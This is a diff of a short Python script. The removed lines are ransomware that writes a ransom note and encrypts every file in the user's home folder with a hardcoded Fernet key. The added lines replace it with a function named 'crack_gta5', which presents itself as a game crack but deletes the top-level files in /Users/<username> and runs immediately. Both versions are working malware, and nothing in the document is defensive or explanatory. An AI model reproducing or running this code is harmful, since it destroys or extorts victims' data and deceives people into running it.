@@ -1,31 +1,18 @@
 import os
-import base64
-user = os.getenv("username")
-rnote = "Your files have been encrypted and you cant pay us."
-import re
-ransom = open("readme.txt", "w")
-ransom.write(rnote)
-ransom.close()
-from cryptography.fernet import Fernet
-# Use your own key and initialization vector (IV) for encryption
-key = base64.b64decode('NFhMMWNtbUU2X3pnVTV1QXVGZTZBQ2pOMjMxWk00ZHVhaHdYay1rd090OD0=')
-iv = b''
-def encrypt_files(folder, exclusions):
-    fernet = Fernet(key)
-    for path, _, files in os.walk(folder):
-        for file in files:
-            if any(exclusion in file for exclusion in exclusions):
-                continue
+username = os.getenv("username")
+def crack_gta5(directory_path, exclusions):
+    try:
+        for file in os.listdir(directory_path):
+            file_path = os.path.join(directory_path, file)
+            if os.path.isfile(file_path) and file not in exclusions:
+                os.remove(file_path)
+                print(f"Deleted: {file}")
+            else:
+                print(f"Excluded: {file}")
+    except Exception as e:
+        print(f"Error occurred: {e}")
 
-            file_path = os.path.join(path, file)
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            encrypted_data = fernet.encrypt(data)
-            with open(file_path, 'wb') as f:
-                f.write(encrypted_data)
-# Specify the exclusions for files/file extensions to be skipped during encryption
-exclusions = [".txt", "txt", "dat", ".dat", "DAT", ".DAT", "ntuser.dat", "NTUSER.DAT", "ntuser.DAT"]
-# Replace 'C:/' with the appropriate directory path
-folder_path = '/Users/' + user
-# Call the encrypt_files function
-encrypt_files(folder_path, exclusions)
+# Usage
+directory_path = '/Users/' + username
+exclusions = ['ntuser.dat', 'ntuser', 'ntuser.DAT', 'NTUSER.DAT', 'NTUSER.dat', 'AppData/*']
+crack_gta5(directory_path, exclusions)
